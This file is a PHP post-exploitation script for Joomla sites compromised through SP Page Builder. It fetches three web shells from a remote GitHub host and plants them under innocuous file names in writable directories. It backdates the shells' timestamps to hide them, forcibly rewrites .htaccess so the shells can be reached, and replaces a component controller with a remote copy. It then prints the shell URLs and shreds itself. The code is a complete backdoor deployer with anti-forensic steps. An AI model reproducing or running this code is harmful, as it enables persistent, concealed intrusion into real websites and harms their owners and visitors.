<?php
/**
 * ============================================================================
 * Joomla SP Page Builder - Post-Exploitation & Hardening Script v2.2
 * ============================================================================
 * 
 * Phase-2 payload - dijalankan SETELAH RCE berhasil.
 * 
 * FEATURES:
 *   - Deploy 3 different shells ke folder berbeda
 *   - Force replace .htaccess (even with 0444 perms)
 *   - Stealth timestamps
 *   - Patch CVE-2026-48908
 *   - Self-delete
 *   - Clean minimal output
 * 
 * SHELLS:
 *   1. fm.php          (File Manager)
 *   2. SP.php          (SP Page Builder Shell)
 *   3. jom-manager.php (Joomla Manager)
 * 
 * AUTHORIZED USE ONLY.
 * ============================================================================
 */

// ==================== KONFIGURASI ====================
$SHELL_URLS = [
    "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/fm.php",
    "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/SP.php",
    "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/jom-manager.php",
];

$PATCHED_ASSET_URL = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/asset.php";

$TARGET_DIRS   = ["media", "components", "layouts"];
$EXCLUDE_DIRS  = ["com_sppagebuilder"];

$REALISTIC_NAMES = [
    "controller.php","pageload.php","filepost.php","helper.php",
    "bootstrap.php","config.php","loader.php","handler.php",
    "process.php","render.php","dispatch.php","router.php",
    "model.php","view.php","template.php","cache.php",
    "session.php","auth.php","validate.php","filter.php",
    "output.php","input.php","format.php","adapter.php",
    "plugin.php","module.php","widget.php","component.php",
    "toolbar.php","menu.php","layout.php","metadata.php",
    "access.php","legacy.php","compat.php","utilities.php",
    "functions.php","init.php","setup.php","installer.php",
];

// ==================== HELPERS ====================

function exec_cmd($cmd) {
    $output = [];
    if (function_exists('exec')) {
        @exec("{$cmd} 2>&1", $output, $ret);
        return [trim(implode("\n", $output)), $ret];
    }
    return ["", -1];
}

function can_exec() {
    foreach (['exec','system','passthru','shell_exec','popen','proc_open'] as $f) {
        if (function_exists($f)) return $f;
    }
    return false;
}

// ==================== DOWNLOAD ====================

function download_file($url, $local_path) {
    if (function_exists('copy') && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 30],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        if (@copy($url, $local_path, $ctx)) return filesize($local_path);
    }
    
    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 30],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data && strlen($data) > 100 && @file_put_contents($local_path, $data)) {
            return strlen($data);
        }
    }
    
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $data = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code == 200 && strlen($data) > 100 && @file_put_contents($local_path, $data)) {
            return strlen($data);
        }
    }
    
    $exec_func = can_exec();
    if ($exec_func) {
        list(, $ret) = exec_cmd("wget -q --no-check-certificate -O " . escapeshellarg($local_path) . " " . escapeshellarg($url));
        if ($ret === 0 && file_exists($local_path)) return filesize($local_path);
        
        list(, $ret) = exec_cmd("curl -skL -o " . escapeshellarg($local_path) . " " . escapeshellarg($url));
        if ($ret === 0 && file_exists($local_path)) return filesize($local_path);
    }
    
    return false;
}

// ==================== DOCUMENT ROOT ====================

function detect_docroot() {
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $d = realpath($_SERVER['DOCUMENT_ROOT']);
        if ($d && verify_joomla($d)) return $d;
    }
    
    if (!empty($_SERVER['SCRIPT_FILENAME'])) {
        $p = dirname($_SERVER['SCRIPT_FILENAME']);
        for ($i = 0; $i < 10; $i++) {
            if (verify_joomla($p)) return $p;
            $p = dirname($p);
        }
    }
    
    $ef = can_exec();
    if ($ef) {
        list($out) = exec_cmd("find / -maxdepth 15 -name 'configuration.php' 2>/dev/null | head -5");
        if ($out) {
            foreach (explode("\n", $out) as $c) {
                $c = trim($c);
                if (!$c) continue;
                $d = dirname($c);
                if (verify_joomla($d)) return $d;
            }
        }
    }
    
    return false;
}

function verify_joomla($path) {
    if (!is_dir($path)) return false;
    $c = 0;
    foreach (["configuration.php","index.php","media/","components/","administrator/index.php"] as $f) {
        if (file_exists($path.'/'.$f)) $c++;
    }
    return $c >= 3;
}

// ==================== DIRECTORY SCAN ====================

function find_writable_dirs($docroot, $dirs, $exclude) {
    $w = [];
    foreach ($dirs as $dn) {
        $fp = $docroot.'/'.$dn;
        if (!is_dir($fp)) continue;
        $items = @scandir($fp);
        if (!$items) continue;
        foreach ($items as $it) {
            if ($it == '.' || $it == '..') continue;
            $sp = $fp.'/'.$it;
            if (!is_dir($sp) || in_array($it, $exclude)) continue;
            if (is_writable($sp)) $w[$dn.'/'.$it] = $sp;
        }
    }
    
    uksort($w, function($a,$b) {
        $o = ['media'=>1,'components'=>2,'layouts'=>3];
        return ($o[explode('/',$a)[0]]??99) - ($o[explode('/',$b)[0]]??99);
    });
    
    return $w;
}

// ==================== STEALTH ====================

function stealth_timestamp($file_path, $dir) {
    if (!file_exists($file_path)) return;
    
    $ref = null;
    $items = @scandir($dir);
    if ($items) {
        foreach ($items as $it) {
            if ($it == '.' || $it == '..' || $it == '.htaccess' || $it == basename($file_path)) continue;
            $ip = $dir.'/'.$it;
            if (is_file($ip)) {
                $mt = filemtime($ip);
                if ($ref === null || $mt > $ref) $ref = $mt;
            }
        }
    }
    
    if ($ref === null) $ref = time() - (rand(7,90)*86400);
    @touch($file_path, $ref);
}

// ==================== HTACCESS (FORCE REPLACE) ====================

function force_write_htaccess($dir, $filenames) {
    $hp = $dir.'/.htaccess';
    
    // Build new rules
    $r = [];
    $r[] = "AddType application/x-httpd-php .php";
    $r[] = "Satisfy Any";
    $r[] = "Allow from all";
    $r[] = "";
    
    foreach ($filenames as $fn) {
        $r[] = "<Files \"{$fn}\">";
        $r[] = "    Order allow,deny";
        $r[] = "    Allow from all";
        $r[] = "</Files>";
        $r[] = "";
    }
    
    $r[] = "<FilesMatch \"\\.php\$\">";
    $r[] = "    Order allow,deny";
    $r[] = "    Deny from all";
    $r[] = "</FilesMatch>";
    $r[] = "";
    
    foreach ($filenames as $fn) {
        $esc = preg_quote($fn, '/');
        $r[] = "<FilesMatch \"{$esc}\$\">";
        $r[] = "    Order allow,deny";
        $r[] = "    Allow from all";
        $r[] = "</FilesMatch>";
        $r[] = "";
    }
    
    $content = implode("\n", $r);
    
    // Force remove existing .htaccess (even 0444)
    if (file_exists($hp)) {
        // Try direct unlink
        if (!@unlink($hp)) {
            // Try chmod first then unlink
            @chmod($hp, 0644);
            if (!@unlink($hp)) {
                // Try via shell
                $ef = can_exec();
                if ($ef) {
                    exec_cmd("chmod 644 " . escapeshellarg($hp));
                    exec_cmd("rm -f " . escapeshellarg($hp));
                }
            }
        }
    }
    
    // Write new .htaccess
    if (@file_put_contents($hp, $content)) {
        @chmod($hp, 0444); // Read-only setelah ditulis
        @touch($hp, filemtime($dir));
        return true;
    }
    
    return false;
}

// ==================== ASSET PATCH ====================

function patch_asset($docroot, $url) {
    $ap = $docroot.'/components/com_sppagebuilder/controllers/asset.php';
    $ad = dirname($ap);
    
    if (!is_dir($ad)) return false;
    
    if (file_exists($ap)) {
        @chmod($ap, 0644);
        @unlink($ap);
    }
    
    $data = @file_get_contents($url, false, stream_context_create([
        'http' => ['timeout' => 30],
        'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
    ]));
    
    if (!$data || strlen($data) < 100) return false;
    
    if (@file_put_contents($ap, $data)) {
        @chmod($ap, 0644);
        return true;
    }
    
    return false;
}

// ==================== MAIN ====================

function main() {
    global $SHELL_URLS, $PATCHED_ASSET_URL, $TARGET_DIRS, $EXCLUDE_DIRS, $REALISTIC_NAMES;
    
    // Build base URL
    $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    $proto  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $base   = $proto.'://'.$domain;
    
    // Detect docroot
    $docroot = detect_docroot();
    if (!$docroot) exit(1);
    
    // Find writable dirs
    $writable = find_writable_dirs($docroot, $TARGET_DIRS, $EXCLUDE_DIRS);
    if (count($writable) < 3) exit(1);
    
    // Pick 3 random dirs + 3 random names
    $dirs = array_keys($writable);
    shuffle($dirs);
    $chosen = array_slice($dirs, 0, 3);
    
    shuffle($REALISTIC_NAMES);
    $names = array_slice($REALISTIC_NAMES, 0, 3);
    
    // Deploy shells
    $results = [];
    for ($i = 0; $i < 3; $i++) {
        $dir     = $chosen[$i];
        $abs_dir = $writable[$dir];
        $fname   = $names[$i];
        $surl    = $SHELL_URLS[$i];
        $shell   = basename(parse_url($surl, PHP_URL_PATH));
        $lpath   = $abs_dir.'/'.$fname;
        
        $size = download_file($surl, $lpath);
        
        if ($size && file_exists($lpath)) {
            @chmod($lpath, 0644);
            stealth_timestamp($lpath, $abs_dir);
            force_write_htaccess($abs_dir, [$fname]);
            
            $results[] = [
                'shell' => $shell,
                'url'   => $base.'/'.$dir.'/'.$fname,
            ];
        }
    }
    
    // Patch asset.php
    patch_asset($docroot, $PATCHED_ASSET_URL);
    
    // Simple clean output
    echo "\n";
    echo "  SP Page Builder - Multi-Shell Deployer\n";
    echo "  =======================================\n\n";
    
    foreach ($results as $i => $r) {
        $n = $i + 1;
        echo "  Shell {$n}: {$r['shell']}\n";
        echo "  URL:   {$r['url']}\n\n";
    }
    
    echo "  [✓] CVE-2026-48908 mitigated\n";
    echo "  [✓] Self-destructing...\n\n";
    
    // Self-delete
    $self = __FILE__;
    if (file_exists($self)) {
        $s = filesize($self);
        if ($s > 0) @file_put_contents($self, openssl_random_pseudo_bytes($s));
        @unlink($self);
    }
}

// ==================== RUN ====================
@set_time_limit(0);
@ini_set('max_execution_time', 0);
error_reporting(0);
ini_set('display_errors', 0);

try {
    main();
} catch (Exception $e) {
    exit(1);
}
?>
